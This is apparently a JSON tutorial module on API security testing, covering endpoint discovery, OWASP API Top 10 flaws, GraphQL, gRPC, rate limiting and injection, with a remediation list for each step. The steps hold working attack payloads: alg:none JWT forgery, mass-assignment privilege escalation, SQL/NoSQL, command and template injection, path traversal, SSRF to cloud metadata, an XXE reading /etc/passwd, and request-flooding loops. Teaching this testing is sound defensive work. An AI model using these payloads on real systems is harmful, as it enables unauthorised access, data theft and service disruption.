{
  "id": "api_security",
  "title": "API Security",
  "description": "Comprehensive API security testing covering REST APIs, GraphQL, gRPC, authentication, authorization, rate limiting, input validation, and OWASP API Top 10 vulnerabilities.",
  "type": "tutorial",
  "steps": [
    {
      "id": "api_discovery_attack_surface",
      "title": "API Discovery & Attack Surface Mapping",
      "content": "OBJECTIVE: Systematically discover and map API endpoints, GraphQL schemas, and REST API structures to establish comprehensive attack surface visibility.\n\nACADEMIC BACKGROUND:\nModern web applications rely heavily on APIs for client-server communication. According to OWASP, inadequate API discovery and documentation leads to exposed attack surfaces. API endpoints often contain sensitive business logic and data access patterns that require thorough enumeration.\n\nAPI Discovery Concepts:\n- REST API endpoint patterns (/api/v1/, /rest/, /v2/)\n- GraphQL schema introspection and endpoint discovery\n- OpenAPI/Swagger documentation enumeration\n- API versioning and deprecated endpoint identification\n- Subdomain and path-based API discovery\n\nSTEP-BY-STEP:\n\n1. ENUMERATE API ENDPOINTS:\n\n   a) Use directory enumeration tools for common API paths:\n   ```bash\n   # Gobuster for API endpoint discovery\n   gobuster dir -u https://api.example.com -w api-endpoints.txt -x json,xml,yaml\n\n   # FFUF for API fuzzing\n   ffuf -u https://api.example.com/FUZZ -w api-paths.txt -mc 200,201,401,403\n   ```\n\n   b) Test multiple API versions and formats:\n   ```bash\n   # Test different API versions\n   curl -I https://api.example.com/v1/users\n   curl -I https://api.example.com/v2/users\n   curl -I https://api.example.com/v3/users\n   ```\n\n2. DISCOVER GRAPHQL ENDPOINTS:\n\n   a) Test for GraphQL introspection:\n   ```bash\n   # Basic introspection query\n   curl -X POST https://api.example.com/graphql \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"query\":\"{__schema{types{name}}}\"}'\n   ```\n\n   b) Extract schema information:\n   ```bash\n   # Full schema dump (if introspection enabled)\n   curl -X POST https://api.example.com/graphql \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"query\":\"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{...TypeRef}}\"}'\n   ```\n\n3. LOCATE API DOCUMENTATION:\n\n   a) Search for OpenAPI/Swagger endpoints:\n   ```bash\n   # Common documentation paths\n   curl -I https://api.example.com/swagger.json\n   curl -I https://api.example.com/api-docs\n   curl -I https://api.example.com/openapi.json\n   curl -I https://api.example.com/docs/api\n   ```\n\n4. ANALYZE CORS CONFIGURATION:\n\n   a) Test cross-origin access policies:\n   ```bash\n   # Test CORS preflight\n   curl -X OPTIONS https://api.example.com/v1/users \\\n     -H \"Origin: https://evil.com\" \\\n     -H \"Access-Control-Request-Method: GET\" \\\n     -v\n   ```\n\nWHAT TO LOOK FOR:\n- Undocumented API endpoints returning 200 OK responses\n- GraphQL introspection returns structured schema data\n- OpenAPI documentation exposes sensitive operations\n- CORS policies allowing unauthorized origins\n- API endpoints on non-standard ports or subdomains\n- Deprecated API versions still accessible\n\nCOMMON PITFALLS:\n- APIs often lack proper authentication requirements\n- GraphQL introspection exposes schema information\n- CORS misconfigurations enable cross-origin attacks\n- API versioning creates inconsistent security controls\n- Documentation endpoints reveal implementation details\n\nDETECTION:\n- Undocumented API endpoints returning 200 OK responses\n- GraphQL introspection returns structured schema data\n- OpenAPI documentation exposes sensitive operations\n- CORS policies allowing unauthorized origins\n\nREMEDIATION:\n- Disable GraphQL introspection in production\n- Implement API authentication on all endpoints\n- Restrict CORS to specific allowed origins\n- Apply consistent rate limiting across API versions\n\nTOOLS AND RESOURCES:\n- gobuster with API mode\n- ffuf for endpoint fuzzing\n- GraphQL introspection queries\n- CORS testing tools",
      "tags": ["api", "security", "discovery", "enumeration", "attack-surface"]
    },
    {
      "id": "owasp_api_top10_auth_bypass",
      "title": "OWASP API Top 10 & Authentication Bypass",
      "content": "OBJECTIVE: Test for OWASP API Top 10 vulnerabilities including Broken Object Level Authorization (BOLA), Broken Authentication, and Mass Assignment attacks.\n\nACADEMIC BACKGROUND:\nThe OWASP API Top 10 represents the most critical API security risks. BOLA (API01:2023) occurs when API endpoints fail to properly authorize access to specific objects. Authentication bypasses and mass assignment vulnerabilities allow attackers to access unauthorized data or escalate privileges.\n\nOWASP API Top 10 Key Risks:\n- API01:2023 - Broken Object Level Authorization\n- API02:2023 - Broken Authentication\n- API03:2023 - Broken Object Property Level Authorization\n- API04:2023 - Unrestricted Resource Consumption\n- API05:2023 - Broken Function Level Authorization\n\nSTEP-BY-STEP:\n\n1. TEST BROKEN OBJECT LEVEL AUTHORIZATION (BOLA):\n\n   a) Extract object IDs from legitimate responses:\n   ```bash\n   # Get user's own profile\n   curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com/v1/users/profile\n   # Response contains user ID: {\"id\": 123, \"name\": \"victim\"}\n   ```\n\n   b) Attempt to access other users' data:\n   ```bash\n   # Try accessing other user IDs\n   curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com/v1/users/124\n   curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com/v1/users/125\n   ```\n\n   c) Test sequential ID enumeration:\n   ```bash\n   # Script to test sequential IDs\n   for id in {1..100}; do\n     curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com/v1/users/$id -w \"%{http_code}\\n\" -s | grep 200\n   done\n   ```\n\n2. TEST MASS ASSIGNMENT VULNERABILITIES:\n\n   a) Send unexpected parameters in JSON payloads:\n   ```bash\n   # Normal update request\n   curl -X PUT https://api.example.com/v1/users/profile \\\n     -H \"Authorization: Bearer $TOKEN\" \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"name\":\"Updated Name\"}'\n   ```\n\n   b) Attempt privilege escalation through mass assignment:\n   ```bash\n   # Try to escalate privileges\n   curl -X PUT https://api.example.com/v1/users/profile \\\n     -H \"Authorization: Bearer $TOKEN\" \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"name\":\"Hacker\",\"role\":\"admin\",\"isAdmin\":true}'\n   ```\n\n3. TEST AUTHENTICATION BYPASS TECHNIQUES:\n\n   a) Test JWT algorithm confusion:\n   ```bash\n   # Create alg:none token\n   echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 -w 0\n   echo -n '{\"user\":\"admin\",\"role\":\"admin\"}' | base64 -w 0\n   echo -n '' | base64 -w 0\n   # Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.\n   ```\n\n   b) Test for weak JWT secrets:\n   ```bash\n   # Use jwt-cracker or hashcat\n   jwt-cracker eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... /path/to/wordlist.txt\n   ```\n\nWHAT TO LOOK FOR:\n- Access to other users' data with 200 OK responses\n- Mass assignment accepts privileged parameters\n- JWT tokens with alg:none or weak secrets\n- Sequential ID patterns allowing enumeration\n- Authentication bypass through token manipulation\n\nCOMMON PITFALLS:\n- APIs trust client-side object IDs without validation\n- Mass assignment doesn't whitelist allowed parameters\n- JWT secrets are weak or commonly used passwords\n- Authentication checks are missing on object access\n- Authorization logic is inconsistent across endpoints\n\nDETECTION:\n- Access to other users' data with 200 OK responses\n- Mass assignment accepts privileged parameters\n- JWT tokens with alg:none or weak secrets\n- Sequential ID patterns allowing enumeration\n\nREMEDIATION:\n- Implement proper object-level authorization checks\n- Use whitelists for mass assignment parameters\n- Use strong, unique JWT secrets with RS256 algorithm\n- Validate all object IDs server-side before access\n\nTOOLS AND RESOURCES:\n- jwt_tool for JWT manipulation testing\n- sqlmap for API parameter testing\n- Burp Suite Intruder for ID enumeration\n- Postman for API testing automation",
      "tags": ["api", "security", "owasp", "authentication", "authorization", "bola", "mass-assignment"]
    },
    {
      "id": "graphql_security_testing",
      "title": "GraphQL Security Testing & Injection",
      "content": "OBJECTIVE: Identify GraphQL-specific vulnerabilities including query injection, schema abuse, and denial of service through complex queries.\n\nACADEMIC BACKGROUND:\nGraphQL provides flexible data querying but introduces unique security challenges. Unlike REST APIs, GraphQL allows clients to specify exactly what data they need, but this flexibility can lead to injection attacks, resource exhaustion, and schema exposure.\n\nGraphQL Security Concepts:\n- Query injection and parameter manipulation\n- Schema introspection and information disclosure\n- Query depth and complexity limits\n- Field enumeration and hidden data discovery\n- Batch query abuse and rate limiting bypass\n\nSTEP-BY-STEP:\n\n1. TEST GRAPHQL INTROSPECTION:\n\n   a) Attempt schema extraction:\n   ```bash\n   # Basic introspection\n   curl -X POST https://api.example.com/graphql \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"query\":\"query{__schema{types{name}}}\"}'\n   ```\n\n   b) Extract full schema if introspection enabled:\n   ```bash\n   # Use GraphQL Voyager or similar tools\n   # Or manual extraction with complex queries\n   curl -X POST https://api.example.com/graphql \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"query\":\"{__schema{queryType{name}types{kind name fields{name}}}}\"}'\n   ```\n\n2. TEST QUERY DEPTH ABUSE:\n\n   a) Create deeply nested queries:\n   ```bash\n   # Test depth limits\n   curl -X POST https://api.example.com/graphql \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"query\":\"query{user{id friends{ id friends{ id friends{ id }}}}}\"}'\n   ```\n\n   b) Test circular references:\n   ```bash\n   # Self-referencing queries\n   curl -X POST https://api.example.com/graphql \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"query\":\"query{user{id manager{ id manager{ id }}}}\"}'\n   ```\n\n3. TEST GRAPHQL INJECTION:\n\n   a) Test argument injection:\n   ```bash\n   # String concatenation injection\n   curl -X POST https://api.example.com/graphql \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"query\":\"query{user(id:\\\"1\\\"){name}}\"}'\n   ```\n\n   b) Test for SQL injection in resolvers:\n   ```bash\n   # If backend uses SQL\n   curl -X POST https://api.example.com/graphql \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"query\":\"query{user(id:\\\"1 OR 1=1\\\"){name}}\"}'\n   ```\n\n4. TEST BATCH QUERY ABUSE:\n\n   a) Use aliases for multiple queries:\n   ```bash\n   # Batch operations\n   curl -X POST https://api.example.com/graphql \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"query\":\"query{user1:user(id:\\\"1\\\"){name} user2:user(id:\\\"2\\\"){name}}\"}'\n   ```\n\n5. TEST MUTATION AUTHORIZATION:\n\n   a) Test unauthorized data modification:\n   ```bash\n   # Attempt privilege escalation\n   curl -X POST https://api.example.com/graphql \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"query\":\"mutation{updateUser(id:\\\"123\\\", role:\\\"admin\\\"){success}}\"}'\n   ```\n\nWHAT TO LOOK FOR:\n- Schema information exposed through introspection\n- Deep queries causing timeouts or high resource usage\n- Injection payloads executed successfully\n- Batch queries bypassing rate limits\n- Unauthorized mutations succeeding\n\nCOMMON PITFALLS:\n- Introspection enabled in production environments\n- No depth/complexity limits on queries\n- Insufficient input validation on GraphQL arguments\n- Authorization checks missing on mutations\n- Error messages revealing implementation details\n\nDETECTION:\n- Schema information exposed through introspection\n- Deep queries causing timeouts or high resource usage\n- Injection payloads executed successfully\n- Batch queries bypassing rate limits\n\nREMEDIATION:\n- Disable introspection in production environments\n- Implement query depth and complexity limits\n- Add proper input validation and sanitization\n- Implement authorization checks on all mutations\n\nTOOLS AND RESOURCES:\n- GraphQL Voyager for schema visualization\n- graphql-path-enum for field enumeration\n- InQL for GraphQL security testing\n- GraphQL Cop for static analysis",
      "tags": ["api", "security", "graphql", "injection", "introspection", "dos"]
    },
    {
      "id": "grpc_protocol_buffer_security",
      "title": "gRPC & Protocol Buffer Security",
      "content": "OBJECTIVE: Test gRPC services for authentication bypasses, authorization flaws, and Protocol Buffer manipulation vulnerabilities.\n\nACADEMIC BACKGROUND:\ngRPC uses Protocol Buffers for efficient serialization and provides streaming capabilities. However, gRPC services can suffer from authentication bypasses, insecure defaults, and protocol-specific attacks. The binary nature of Protocol Buffers makes testing more challenging but equally important.\n\ngRPC Security Concepts:\n- Service reflection and method discovery\n- Protocol Buffer message manipulation\n- Authentication and authorization bypasses\n- TLS configuration weaknesses\n- Streaming abuse and resource exhaustion\n\nSTEP-BY-STEP:\n\n1. DISCOVER GRPC SERVICES:\n\n   a) Test for gRPC reflection:\n   ```bash\n   # Use grpcurl for service discovery\n   grpcurl -plaintext localhost:50051 list\n\n   # List all services\n   grpcurl -plaintext localhost:50051 list svc\n\n   # Get service methods\n   grpcurl -plaintext localhost:50051 describe svc.UserService\n   ```\n\n   b) Test gRPC-web endpoints:\n   ```bash\n   # gRPC-web uses HTTP/1.1 with special headers\n   curl -X POST https://api.example.com/grpc \\\n     -H \"Content-Type: application/grpc-web\" \\\n     -H \"X-Grpc-Web: 1\" \\\n     --data-binary @request.bin\n   ```\n\n2. TEST PROTOCOL BUFFER MANIPULATION:\n\n   a) Extract .proto files if available:\n   ```bash\n   # Look for proto files in source repositories\n   find . -name \"*.proto\" -type f\n   ```\n\n   b) Test message field manipulation:\n   ```bash\n   # Use grpcurl to test malformed messages\n   grpcurl -plaintext -d '{\"id\": \"123\", \"role\": \"admin\"}' \\\n     localhost:50051 svc.UserService/UpdateProfile\n   ```\n\n3. TEST AUTHENTICATION BYPASSES:\n\n   a) Test missing authentication:\n   ```bash\n   # Try unauthenticated access\n   grpcurl -plaintext localhost:50051 svc.UserService/GetProfile\n   ```\n\n   b) Test weak token validation:\n   ```bash\n   # Test JWT in metadata\n   grpcurl -plaintext -rpc-header \"authorization: Bearer invalid.jwt.here\" \\\n     localhost:50051 svc.UserService/GetProfile\n   ```\n\n4. TEST STREAMING ABUSE:\n\n   a) Test bidirectional streaming limits:\n   ```bash\n   # Use grpcurl for streaming tests\n   grpcurl -plaintext -d @ localhost:50051 svc.ChatService/StreamMessages\n   ```\n\n   b) Test resource exhaustion:\n   ```bash\n   # Flood with streaming requests\n   for i in {1..100}; do\n     grpcurl -plaintext -d '{}' localhost:50051 svc.Service/Method &\n   done\n   ```\n\nWHAT TO LOOK FOR:\n- gRPC reflection enabled in production\n- Services accessible without authentication\n- Protocol Buffer messages accepting invalid data\n- Streaming endpoints vulnerable to abuse\n- TLS not properly configured\n\nCOMMON PITFALLS:\n- gRPC reflection exposes service metadata\n- Default insecure configurations used in production\n- Authentication tokens not properly validated\n- No rate limiting on streaming endpoints\n- Error messages reveal sensitive information\n\nDETECTION:\n- gRPC reflection enabled in production\n- Services accessible without authentication\n- Protocol Buffer messages accepting invalid data\n- Streaming endpoints vulnerable to abuse\n\nREMEDIATION:\n- Disable gRPC reflection in production\n- Implement proper authentication and authorization\n- Validate Protocol Buffer messages server-side\n- Implement rate limiting on streaming endpoints\n\nTOOLS AND RESOURCES:\n- grpcurl for gRPC service testing\n- grpcui for web-based gRPC testing\n- Evans for interactive gRPC client\n- Protobuf compiler for message analysis",
      "tags": ["api", "security", "grpc", "protocol-buffers", "streaming", "reflection"]
    },
    {
      "id": "rate_limiting_abuse_prevention",
      "title": "Rate Limiting & Abuse Prevention",
      "content": "OBJECTIVE: Test API rate limiting implementations for bypass opportunities, resource exhaustion, and denial of service vulnerabilities.\n\nACADEMIC BACKGROUND:\nRate limiting protects APIs from abuse and resource exhaustion. However, poorly implemented rate limiting can be bypassed through various techniques. OWASP API04:2023 (Unrestricted Resource Consumption) highlights the importance of proper rate limiting and resource controls.\n\nRate Limiting Concepts:\n- Request throttling and quota enforcement\n- Rate limit bypass techniques (IP rotation, header manipulation)\n- Resource exhaustion through expensive operations\n- Distributed rate limiting challenges\n- Business logic abuse vs. volumetric attacks\n\nSTEP-BY-STEP:\n\n1. IDENTIFY RATE LIMITING MECHANISMS:\n\n   a) Test request frequency limits:\n   ```bash\n   # Burst requests to trigger rate limiting\n   for i in {1..100}; do\n     curl -X GET https://api.example.com/v1/users -w \"%{http_code} \" &\n   done\n   ```\n\n   b) Check rate limit headers:\n   ```bash\n   # Examine response headers\n   curl -I https://api.example.com/v1/users\n   # Look for: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset\n   ```\n\n2. TEST RATE LIMIT BYPASS TECHNIQUES:\n\n   a) IP rotation and proxy usage:\n   ```bash\n   # Use different IP addresses\n   curl --proxy http://proxy1.example.com:8080 https://api.example.com/v1/users\n   curl --proxy http://proxy2.example.com:8080 https://api.example.com/v1/users\n   ```\n\n   b) Header manipulation:\n   ```bash\n   # Try different user agents, referers\n   curl -H \"User-Agent: Bot/1.0\" https://api.example.com/v1/users\n   curl -H \"Referer: https://evil.com\" https://api.example.com/v1/users\n   ```\n\n   c) Cookie manipulation:\n   ```bash\n   # Test cookie-based rate limiting\n   curl -H \"Cookie: session=abc123\" https://api.example.com/v1/users\n   curl -H \"Cookie: session=def456\" https://api.example.com/v1/users\n   ```\n\n3. TEST BUSINESS LOGIC ABUSE:\n\n   a) Expensive operation abuse:\n   ```bash\n   # Operations that consume significant resources\n   curl -X POST https://api.example.com/v1/search \\\n     -d '{\"query\":\"*\", \"limit\": 10000, \"sort\": \"complex\"}'\n   ```\n\n   b) Algorithmic complexity attacks:\n   ```bash\n   # Test with computationally expensive inputs\n   curl -X POST https://api.example.com/v1/process \\\n     -d '{\"data\": \"very_long_string\" * 1000}'\n   ```\n\n4. TEST DISTRIBUTED ATTACKS:\n\n   a) Multi-threaded abuse:\n   ```bash\n   # Parallel requests from single IP\n   seq 1 10 | xargs -n1 -P10 curl -s https://api.example.com/v1/users >/dev/null\n   ```\n\n   b) API key rotation:\n   ```bash\n   # If API keys are used\n   curl -H \"X-API-Key: key1\" https://api.example.com/v1/users\n   curl -H \"X-API-Key: key2\" https://api.example.com/v1/users\n   ```\n\nWHAT TO LOOK FOR:\n- Rate limit headers revealing limits and reset times\n- Bypass techniques successfully evading limits\n- Expensive operations not properly restricted\n- Distributed attacks overwhelming defenses\n- Inconsistent rate limiting across endpoints\n\nCOMMON PITFALLS:\n- Rate limiting based only on IP addresses\n- No protection against distributed attacks\n- Expensive operations not rate limited\n- Rate limit bypass through header manipulation\n- Inconsistent enforcement across API versions\n\nDETECTION:\n- Rate limit headers revealing limits and reset times\n- Bypass techniques successfully evading limits\n- Expensive operations not properly restricted\n- Distributed attacks overwhelming defenses\n\nREMEDIATION:\n- Implement multi-factor rate limiting (IP + user + endpoint)\n- Use distributed rate limiting systems\n- Apply rate limits to expensive operations\n- Implement consistent rate limiting across all endpoints\n\nTOOLS AND RESOURCES:\n- vegeta for load testing and rate limit testing\n- hey for HTTP load testing\n- siege for stress testing\n- wrk for performance testing",
      "tags": ["api", "security", "rate-limiting", "dos", "abuse-prevention", "load-testing"]
    },
    {
      "id": "input_validation_injection_attacks",
      "title": "Input Validation & Injection Attacks",
      "content": "OBJECTIVE: Test API input validation for injection vulnerabilities, parameter manipulation, and data sanitization failures.\n\nACADEMIC BACKGROUND:\nInput validation is critical for API security. Injection attacks (SQL, NoSQL, command injection) occur when untrusted input is processed without proper validation. APIs often accept complex data structures that require thorough validation.\n\nInput Validation Concepts:\n- Parameter injection and manipulation\n- SQL/NoSQL injection techniques\n- Command injection in API processing\n- XML external entity (XXE) attacks\n- Server-side request forgery (SSRF)\n- Template injection vulnerabilities\n\nSTEP-BY-STEP:\n\n1. TEST SQL INJECTION:\n\n   a) Test query parameters:\n   ```bash\n   # Basic SQL injection\n   curl \"https://api.example.com/v1/users?search=' OR '1'='1\"\n   curl \"https://api.example.com/v1/users?id=1' UNION SELECT * FROM users--\"\n   ```\n\n   b) Test POST body injection:\n   ```bash\n   # JSON parameter injection\n   curl -X POST https://api.example.com/v1/search \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"query\": \"admin'\\'' OR 1=1 --\"}'\n   ```\n\n2. TEST NOSQL INJECTION:\n\n   a) MongoDB operator injection:\n   ```bash\n   # MongoDB query injection\n   curl -X POST https://api.example.com/v1/users \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}'\n   ```\n\n   b) Test for NoSQL blind injection:\n   ```bash\n   # Time-based injection\n   curl -X POST https://api.example.com/v1/auth \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"username\": \"admin\", \"password\": {\"$regex\": \".*\"}}'\n   ```\n\n3. TEST COMMAND INJECTION:\n\n   a) Test system command execution:\n   ```bash\n   # Command injection in parameters\n   curl \"https://api.example.com/v1/process?file=../../../etc/passwd\"\n   curl -X POST https://api.example.com/v1/execute \\\n     -d 'command=ls; cat /etc/passwd'\n   ```\n\n4. TEST SSRF VULNERABILITIES:\n\n   a) URL parameter manipulation:\n   ```bash\n   # Internal service access\n   curl \"https://api.example.com/v1/fetch?url=http://localhost:8080/admin\"\n   curl \"https://api.example.com/v1/fetch?url=http://169.254.169.254/latest/meta-data/\"\n   ```\n\n   b) Host header injection:\n   ```bash\n   # Host header SSRF\n   curl -H \"Host: localhost\" https://api.example.com/v1/webhook\n   ```\n\n5. TEST TEMPLATE INJECTION:\n\n   a) Test for template engine injection:\n   ```bash\n   # Template injection attempts\n   curl -X POST https://api.example.com/v1/render \\\n     -d 'template={{7*7}}&data=user_input'\n   ```\n\n6. TEST XML/XXE ATTACKS:\n\n   a) Test for XML external entities:\n   ```bash\n   # XXE payload\n   curl -X POST https://api.example.com/v1/xml \\\n     -H \"Content-Type: application/xml\" \\\n     -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'\n   ```\n\nWHAT TO LOOK FOR:\n- SQL syntax errors or unexpected results\n- Authentication bypass through injection\n- File system access through command injection\n- Internal service access through SSRF\n- Template execution in user input\n- External entity resolution in XML\n\nCOMMON PITFALLS:\n- Input validation only on client-side\n- Blacklist-based filtering instead of whitelist\n- Missing parameterized queries\n- Trusting user-controlled URLs\n- No XML parser security configuration\n- Insufficient error handling revealing injection success\n\nDETECTION:\n- SQL syntax errors or unexpected results\n- Authentication bypass through injection\n- File system access through command injection\n- Internal service access through SSRF\n\nREMEDIATION:\n- Implement server-side input validation with whitelists\n- Use parameterized queries and prepared statements\n- Validate and sanitize all user-controlled URLs\n- Disable external entity processing in XML parsers\n\nTOOLS AND RESOURCES:\n- sqlmap for SQL injection testing\n- nosqlmap for NoSQL injection testing\n- ssrfmap for SSRF vulnerability testing\n- Burp Suite for comprehensive injection testing",
      "tags": ["api", "security", "input-validation", "injection", "sql-injection", "ssrf", "xxe"]
    },
    {
      "id": "api_security_quiz",
      "title": "API Security Quiz",
      "content": "Quiz content loaded from api_security/api-security-quiz.txt",
      "tags": ["quiz", "api", "security", "authentication", "authorization"]
    }
  ]
}